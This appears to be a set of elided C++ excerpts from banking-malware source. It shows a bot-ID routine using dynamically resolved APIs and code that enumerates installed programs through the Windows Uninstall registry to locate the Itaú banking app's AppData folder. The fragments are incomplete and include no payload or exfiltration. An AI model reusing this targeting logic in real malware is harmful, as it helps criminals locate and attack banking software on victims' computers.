...
void GetBotId(char *botId)
{
   ...
   Funcs::pWsprintfA(botId, "\default_set");
}
    ...
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        ...
        for (DWORD i = 0;; i++) {
            ...
            if (RegOpenKeyEx(hKey, displayName, 0, KEY_READ, &appKey) == ERROR_SUCCESS) {
                ...
                if (RegQueryValueEx(appKey, "InstallSource", NULL, NULL, (LPBYTE)exeName, &exeNameSize) == ERROR_SUCCESS) {
                    string data;
                    data = exeName;
                    list.push_back(data);
                }
...
std::string getLocalAppdata()
{
    ...
    getInstallationAppsList(list);
    for (const auto& item : list) {
        if (item.find("Aplicativo Itau") != std::string::npos)
            itaupath = item;
    }

    size_t  appDataPos = itaupath.find("\\Aplicativo Itau");
    if (appDataPos != std::string::npos) {
        // Extract the substring starting from "\AppData"
        std::string path = itaupath.substr(0, appDataPos);
        return path;
    }

    return FORCE_TEMP_PATH;
}